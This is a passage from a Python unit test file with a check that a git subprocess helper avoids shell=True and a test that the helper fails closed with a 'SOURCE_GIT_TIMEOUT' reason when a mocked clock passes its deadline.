    assert "shell" not in kw


def test_git_deadline_fail_closed_without_sleep(plan):
    fn = plan["git_bytes"]
    ticks = iter([0, 99])
    class Clock:
        monotonic = staticmethod(lambda: next(ticks))
    fn.__globals__["time"] = Clock
    reason(lambda: fn("rev-parse", "HEAD"), "SOURCE_GIT_TIMEOUT")
